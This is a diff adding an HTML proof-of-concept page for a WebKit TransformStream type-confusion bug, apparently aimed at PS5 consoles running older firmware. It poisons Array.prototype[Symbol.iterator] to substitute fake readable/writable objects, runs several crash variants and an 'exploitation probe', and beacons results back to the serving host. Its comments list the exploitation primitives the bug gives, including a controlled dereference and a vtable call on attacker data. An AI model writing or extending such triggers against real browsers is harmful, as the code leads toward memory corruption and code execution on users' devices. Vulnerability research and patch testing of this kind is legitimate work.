@@ -1,0 +1,202 @@
+<!--
+  p673: CVE-2026-43705 — TransformStream type confusion via poisoned Symbol.iterator
+  Fix: commit 8fd92b1, Jun 30, 2026 (Safari 26.5) — WELL AFTER PS5 14.10 cutoff
+  
+  Bug: createInternalTransformStreamFromTransformer returns a 3-element array.
+  C++ iterates it with convert<IDLSequence<IDLObject>> which uses JS iteration protocol.
+  If Array.prototype[Symbol.iterator] is overridden, attacker substitutes arbitrary objects
+  for readable/writable entries. C++ does dynamicDowncast<JSReadableStream*> and
+  dereferences WITHOUT null-check → controlled type confusion.
+  
+  Primitives:
+    - Controlled deref via m_wrapped
+    - Write-increment via Ref<>::ref()  
+    - vtable call on attacker data when JS touches .readable/.writable
+  
+  Phase A: Check TransformStream exists
+  Phase B: Exact regression test from commit (crash = vulnerable)
+  Phase C: Variant 2 — object with heap pointer (survives initial deref)
+  Phase D: Variant 3 — truncated iterator
+  Phase E: Exploitation probe — try to read .readable/.writable after confusion
+  
+  CRASH_CLASS: HIGH (type confusion → controlled crash, potential code exec)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p673</title></head>
+<body>p673: TransformStream type confusion
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P673-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+
+emit('START','v1');flush();
+
+// ================================================================
+// PHASE A: Check TransformStream existence
+// ================================================================
+emit('A','transformstream-check');
+try{
+  var hasTS=typeof TransformStream;
+  emit('A-TYPEOF',hasTS);
+  if(hasTS==='function'){
+    // Quick sanity: can we construct one normally?
+    try{
+      var ts=new TransformStream();
+      emit('A-CONSTRUCT','ok readable='+(typeof ts.readable)+' writable='+(typeof ts.writable));
+    }catch(e2){emit('A-CONSTRUCT','threw '+e2.name+':'+e2.message);}
+  }
+  emit('A-RESULT',hasTS==='function'?'AVAILABLE':'MISSING');
+  if(hasTS!=='function'){emit('A-VERDICT','SKIP — no TransformStream');flush();return;}
+}catch(e){emit('A-ERR',e.name+':'+e.message);emit('A-RESULT','ERROR');flush();return;}
+flush();
+
+// Save original iterator
+var originalIterator=Array.prototype[Symbol.iterator];
+
+// ================================================================
+// PHASE B: Variant 1 — plain object substitution (from regression test)
+// On vulnerable: CRASH (null deref on dynamicDowncast result)
+// On patched: TypeError thrown
+// ================================================================
+emit('B','variant1-plain-object');
+try{
+  Array.prototype[Symbol.iterator]=function(){
+    var arr=this,i=0;
+    return{next:function(){
+      if(i>=arr.length)return{done:true};
+      var val=arr[i];
+      // The builtin returns a 3-element array: [transform, readable, writable]
+      // We substitute indices 1 and 2 (readable/writable) with plain objects
+      if(arr.length===3&&i>=1) val={fake:true};
+      i++;
+      return{value:val,done:false};
+    }};
+  };
+  try{
+    new TransformStream();
+    emit('B-RESULT','NO-THROW — constructor succeeded (unexpected)');
+  }catch(e){
+    if(e instanceof TypeError){
+      emit('B-RESULT','THREW-TypeError — '+e.message);
+    } else {
+      emit('B-RESULT','THREW-'+e.name+' — '+e.message);
+    }
+  }
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+Array.prototype[Symbol.iterator]=originalIterator;
+flush();
+
+// ================================================================
+// PHASE C: Variant 2 — object with heap pointer
+// Survives initial deref, triggers write-increment / vtable hijack
+// On vulnerable: CRASH with controlled data
+// On patched: TypeError
+// ================================================================
+emit('C','variant2-heap-pointer');
+try{
+  var buf=new ArrayBuffer(65536);
+  Array.prototype[Symbol.iterator]=function(){
+    var arr=this,i=0;
+    return{next:function(){
+      if(i>=arr.length)return{done:true};
+      var val=arr[i];
+      if(arr.length===3&&i>=1) val={pad:0,ptr:buf};
+      i++;
+      return{value:val,done:false};
+    }};
+  };
+  try{
+    new TransformStream();
+    emit('C-RESULT','NO-THROW — survived (unexpected)');
+  }catch(e){
+    if(e instanceof TypeError){
+      emit('C-RESULT','THREW-TypeError — '+e.message);
+    } else {
+      emit('C-RESULT','THREW-'+e.name+' — '+e.message);
+    }
+  }
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+Array.prototype[Symbol.iterator]=originalIterator;
+flush();
+
+// ================================================================
+// PHASE D: Variant 3 — truncated iterator (fewer than 3 entries)
+// On vulnerable: CRASH (OOB read on results vector)
+// On patched: TypeError
+// ================================================================
+emit('D','variant3-truncated');
+try{
+  Array.prototype[Symbol.iterator]=function(){
+    return{next:function(){return{done:true};}};
+  };
+  try{
+    new TransformStream();
+    emit('D-RESULT','NO-THROW');
+  }catch(e){
+    if(e instanceof TypeError){
+      emit('D-RESULT','THREW-TypeError — '+e.message);
+    } else {
+      emit('D-RESULT','THREW-'+e.name+' — '+e.message);
+    }
+  }
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+Array.prototype[Symbol.iterator]=originalIterator;
+flush();
+
+// ================================================================
+// PHASE E: Exploitation probe — if constructor survives variant 1,
+// try to access .readable/.writable on the confused object
+// This would trigger the vtable call on attacker-controlled data
+// ================================================================
+emit('E','exploitation-probe');
+try{
+  var confused=null;
+  var marker={toString:function(){return'MARKER_HIT';}};
+  Array.prototype[Symbol.iterator]=function(){
+    var arr=this,i=0;
+    return{next:function(){
+      if(i>=arr.length)return{done:true};
+      var val=arr[i];
+      if(arr.length===3&&i===1) val=marker; // fake readable
+      if(arr.length===3&&i===2) val=marker; // fake writable
+      i++;
+      return{value:val,done:false};
+    }};
+  };
+  try{
+    confused=new TransformStream();
+    emit('E-CONSTRUCT','survived!');
+    // If we get here, the type confusion succeeded without crash
+    // Try accessing .readable — this triggers vtable call
+    try{
+      var r=confused.readable;
+      emit('E-READABLE','type='+typeof r+' val='+String(r).slice(0,60));
+    }catch(e2){emit('E-READABLE','threw '+e2.name+':'+e2.message);}
+    try{
+      var w=confused.writable;
+      emit('E-WRITABLE','type='+typeof w+' val='+String(w).slice(0,60));
+    }catch(e2){emit('E-WRITABLE','threw '+e2.name+':'+e2.message);}
+    emit('E-RESULT','TYPE-CONFUSION-SURVIVED — exploitable!');
+  }catch(e){
+    emit('E-RESULT','THREW-'+e.name+' — '+e.message);
+  }
+}catch(e){emit('E-ERR',e.name+':'+e.message);}
+Array.prototype[Symbol.iterator]=originalIterator;
+flush();
+
+// ================================================================
+// VERDICT
+// ================================================================
+emit('VERDICT','---');
+// Analyze: if B threw TypeError with "unexpected number" or "unexpected types"
+// message, the fix is present. If B didn't throw or crashed, the bug is live.
+// If A showed MISSING, TransformStream doesn't exist on this browser.
+emit('DONE','p673-complete');
+flush();
+})();
+</script>
+</body>
+</html>
